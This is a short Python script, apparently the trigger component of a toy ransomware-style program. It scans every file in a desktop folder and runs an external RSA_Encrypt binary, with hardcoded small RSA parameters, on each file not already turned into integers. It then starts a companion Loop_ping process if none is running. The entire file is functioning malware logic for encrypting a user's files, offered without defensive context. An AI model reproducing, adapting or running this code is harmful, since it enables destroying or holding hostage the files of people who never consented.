#!/usr/bin/python3
import os, sys, stat
import subprocess
from os import listdir
from os.path import isfile, isdir, join
cwd = os.getcwd()

Ned = (126419, 30743, 55439)
mypath = "/home/attacker/Desktop"
files = listdir(mypath)
dire = ''
for f in files:
    fullpath = join(mypath, f)
    if isfile(fullpath):
        read_file = open(fullpath, 'r')
        content = str(read_file.read()).strip()
        content_list = content.split(' ', -1)
        flag = True
        for word in content_list:
            try:
                word = int(word)
            except ValueError:
                flag = False
                break
        if not flag:
            absFilePath = os.path.abspath(__file__)
            dire = absFilePath.replace('/trigger.py', '')
            dire += '/RSA_Encrypt'
            subprocess.Popen([dire, '-C', '126419', '30743', fullpath])
        read_file.close()

tmp = os.popen('pgrep Loop_ping').readlines()
if tmp == []:
    dire = dire.replace('/RSA_Encrypt', '')
    dire += '/Loop_ping'
    subprocess.Popen([dire])
exit(0)